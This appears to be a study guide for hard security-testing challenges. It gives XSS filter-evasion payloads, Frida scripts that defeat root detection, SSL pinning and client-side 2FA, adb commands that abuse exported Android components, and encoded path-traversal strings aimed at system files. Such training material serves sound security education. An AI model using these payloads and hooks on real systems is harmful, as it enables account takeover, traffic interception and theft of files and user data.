# ⚫ EXCEPTIONAL Challenges (Success Ratio: 33%)

> These are the hardest challenges. Solving even 2-3 of these puts you ahead of most candidates.

---

## Challenge 12: XSS via WAF Bypass

### What They Test
Can you bypass a server-side WAF to achieve XSS?

### Advanced WAF Bypass Payloads
```html
<!-- Unicode/encoding bypasses -->
<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>
<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>

<!-- Using less common tags -->
<details open ontoggle=alert(1)>
<math><mi//onmouseover=alert(1)>
<xss id=x onfocus=alert(1) tabindex=1>#x

<!-- Breaking up keywords with null bytes -->
<scr%00ipt>alert(1)</scr%00ipt>

<!-- SVG-based XSS -->
<svg><animate onbegin=alert(1) attributeName=x>
<svg><set onbegin=alert(1) attributedName=x>

<!-- Using JavaScript protocol -->
<a href=javascript:alert(1)>click</a>
<a href=javas%09cript:alert(1)>click</a>
<a href=javas%0acript:alert(1)>click</a>

<!-- DOM-based techniques -->
<img src=x onerror=top['al'+'ert'](1)>
<img src=x onerror=window['al\x65rt'](1)>
<img src=x onerror=self[atob('YWxlcnQ=')](1)>

<!-- Using constructor -->
<img src=x onerror="Function('ale'+'rt(1)')()">
<img src=x onerror=[].constructor.constructor('alert(1)')()>

<!-- Form-based -->
<form action=javascript:alert(1)><button>X</button>
<isindex action=javascript:alert(1) type=submit value=XSS>

<!-- Double encoding (WAF decodes once, app decodes twice) -->
%253Cscript%253Ealert(1)%253C/script%253E
```

### Strategy
1. First determine what the WAF blocks (try basic payloads, note responses)
2. Identify the WAF product (response headers, error pages)
3. Use WAF-specific bypass techniques
4. Try encoding chains: URL → HTML → Unicode
5. Test with less common HTML elements and event handlers

---

## Challenge 29: Hard Coded Secrets in Application 2

### What They Test
Finding deeply hidden secrets — likely in compiled/obfuscated code.

### Methodology
```bash
# Check JavaScript source maps
curl https://target.com/static/js/main.js.map
# Use Source Map Explorer to view original source

# Beautify minified JavaScript
# Browser: Sources tab → {} (Pretty print)
# Or: js-beautify main.js > beautified.js

# Search in beautified code
grep -i "password\|secret\|key\|token\|api" beautified.js

# Check API responses for leaked secrets
# Monitor Network tab for configuration endpoints

# Check WebAssembly modules
# .wasm files may contain secrets
wasm-decompile module.wasm

# Check for service workers
# Application tab → Service Workers → view source

# Check IndexedDB / Web SQL
# Application tab → IndexedDB

# Deobfuscation
# https://deobfuscate.io
# https://lelinhtinh.github.io/de4js/

# Mobile apps (if applicable)
# APK: jadx-gui app.apk → search for secrets
# Strings: strings app.apk | grep -i "key\|secret\|password"
```

---

## Challenge 30: Root Detection and SSL Pinning Bypass

### What They Test
Can you bypass mobile app security controls?

### Root Detection Bypass
```bash
# Using Frida
frida -U -f com.target.app -l root_bypass.js

# root_bypass.js
Java.perform(function() {
    // Hook common root detection methods
    var RootBeer = Java.use("com.scottyab.rootbeer.RootBeer");
    RootBeer.isRooted.implementation = function() {
        console.log("isRooted() bypassed");
        return false;
    };
    
    // Hook file existence checks
    var File = Java.use("java.io.File");
    File.exists.implementation = function() {
        var filename = this.getAbsolutePath();
        if (filename.indexOf("su") >= 0 || 
            filename.indexOf("Superuser") >= 0 ||
            filename.indexOf("magisk") >= 0) {
            return false;
        }
        return this.exists.call(this);
    };
});

# Using Magisk
# Enable MagiskHide for the target app
# Or use "Deny List" in newer Magisk versions

# Using Objection (built on Frida)
objection -g com.target.app explore
android root disable
android root simulate
```

### SSL Pinning Bypass
```bash
# Using Frida + objection
objection -g com.target.app explore
android sslpinning disable

# Using Frida script
frida -U -f com.target.app -l ssl_bypass.js

# ssl_bypass.js (universal SSL pinning bypass)
Java.perform(function() {
    // TrustManager bypass
    var TrustManager = Java.registerClass({
        name: 'com.custom.TrustManager',
        implements: [Java.use('javax.net.ssl.X509TrustManager')],
        methods: {
            checkClientTrusted: function(chain, authType) {},
            checkServerTrusted: function(chain, authType) {},
            getAcceptedIssuers: function() { return []; }
        }
    });

    var SSLContext = Java.use('javax.net.ssl.SSLContext');
    var SSLContextInit = SSLContext.init.overload(
        '[Ljavax.net.ssl.KeyManager;',
        '[Ljavax.net.ssl.TrustManager;',
        'java.security.SecureRandom'
    );
    SSLContextInit.implementation = function(keyManager, trustManager, secureRandom) {
        SSLContextInit.call(this, keyManager, [TrustManager.$new()], secureRandom);
    };
    
    // OkHttp CertificatePinner bypass
    try {
        var CertificatePinner = Java.use('okhttp3.CertificatePinner');
        CertificatePinner.check.overload('java.lang.String', 'java.util.List').implementation = function() {};
    } catch(e) {}
});

# Alternative: Install user CA cert as system cert (Android <7)
# Or use Magisk module "Move Certificates" for Android 7+
```

---

## Challenge 31: Improper Export of Android Application Components

### What They Test
Can you exploit improperly exported Android components?

### Methodology
```bash
# 1. Decompile APK
apktool d target.apk
jadx-gui target.apk

# 2. Check AndroidManifest.xml for exported components
grep -i "exported=\"true\"" AndroidManifest.xml

# Look for:
# <activity android:exported="true" ...>
# <service android:exported="true" ...>
# <receiver android:exported="true" ...>
# <provider android:exported="true" ...>

# Also: activities with intent-filters are exported by default!

# 3. Exploit exported activities
adb shell am start -n com.target.app/.AdminActivity
adb shell am start -n com.target.app/.DebugActivity

# 4. Exploit exported services
adb shell am startservice -n com.target.app/.BackgroundService

# 5. Exploit exported broadcast receivers
adb shell am broadcast -a com.target.app.RESET_PASSWORD -n com.target.app/.PasswordResetReceiver

# 6. Exploit exported content providers
adb shell content query --uri content://com.target.app.provider/users
adb shell content query --uri content://com.target.app.provider/secrets

# 7. Drozer (comprehensive Android testing)
drozer console connect
run app.package.attacksurface com.target.app
run app.activity.info -a com.target.app
run app.activity.start --component com.target.app com.target.app.AdminActivity
run app.provider.query content://com.target.app.provider/users
```

---

## Challenge 32: 2FA Bypass Android

### What They Test
Can you bypass 2FA in an Android application?

### Methodology
```bash
# 1. Decompile and analyze 2FA logic
jadx-gui target.apk
# Search for: OTP, verify, 2fa, two_factor, mfa

# 2. Check if verification is client-side
# Look for: response comparison in Java code
# If OTP is checked locally → modify the check via Frida

# 3. Frida hook to bypass verification
Java.perform(function() {
    var OTPVerifier = Java.use("com.target.app.OTPVerifier");
    OTPVerifier.verify.implementation = function(otp) {
        console.log("OTP bypass - returning true");
        return true;
    };
});

# 4. Intercept and modify response
# Using Burp/mitmproxy after SSL pinning bypass
# Change {"verified": false} to {"verified": true}

# 5. Check for OTP in API response
# Some apps return the OTP in the initial response
# Or in debug headers

# 6. Manipulate intent extras
# If 2FA activity receives result via Intent:
adb shell am start -n com.target.app/.DashboardActivity \
  --ez "is_verified" true

# 7. Shared preferences manipulation
adb shell run-as com.target.app cat shared_prefs/settings.xml
# Modify: <boolean name="2fa_verified" value="true" />
```

---

## Challenge 38: Code Review - Path Traversal Bypass

### What They Test
Can you identify and bypass path traversal protections in source code?

### Common Vulnerable Patterns
```python
# VULNERABLE: Simple replacement (single pass)
filename = user_input.replace("../", "")
# BYPASS: ....//....//etc/passwd → ../../../etc/passwd

# VULNERABLE: Only checks start of path
if not filepath.startswith("/uploads/"):
    deny()
# BYPASS: /uploads/../../../etc/passwd

# VULNERABLE: URL decoding not considered
filename = sanitize(user_input)  # Checks for ../
# BYPASS: %2e%2e%2f or %252e%252e%252f (double encoded)

# VULNERABLE: Backslash not handled (Windows)
if ".." not in filename:
    allow()
# BYPASS: ..\ on Windows systems

# VULNERABLE: Null byte (older languages/runtimes)
filename = user_input + ".pdf"
# BYPASS: ../../etc/passwd%00 → truncates at null byte
```

### Payloads
```
../../../etc/passwd
..%2f..%2f..%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
....//....//....//etc/passwd
..%252f..%252f..%252fetc%252fpasswd
..\/..\/..\/etc/passwd
..%c0%af..%c0%af..%c0%afetc/passwd
%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd

# Windows variants
..\..\..\windows\win.ini
..%5c..%5c..%5cwindows%5cwin.ini
```

### What to Look For in Code Review
1. **Single-pass replacement** of `../` → nest it: `....//`
2. **Case-sensitive** checks → `..\/` or `..%2F`
3. **Blacklist instead of whitelist** approach
4. **No canonical path resolution** before comparison
5. **Missing null byte handling** (older systems)
6. **Only checking forward slash** but not backslash
